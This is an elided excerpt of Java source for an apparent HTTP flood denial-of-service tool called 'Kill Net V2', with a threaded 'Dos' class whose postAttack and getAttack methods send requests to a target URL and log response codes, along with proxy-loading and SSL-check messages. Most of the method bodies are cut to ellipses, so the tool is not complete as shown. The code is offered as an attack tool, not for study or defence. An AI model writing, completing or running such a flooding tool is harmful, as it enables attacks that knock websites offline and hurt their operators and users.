...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Welcome to Kill Net V2");
        ...
        System.out.println("Kill Net V2 Update API");
        ...
        System.out.println("Proxy Global Loading Sending To Tool");
    ...
    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection please wait (ssl)");
        URL obj = new URL(url);
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Loading Send Data To Website: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Dinh Tu Send Attack : " + responseCode + "Thread: " + this.seq);
    }
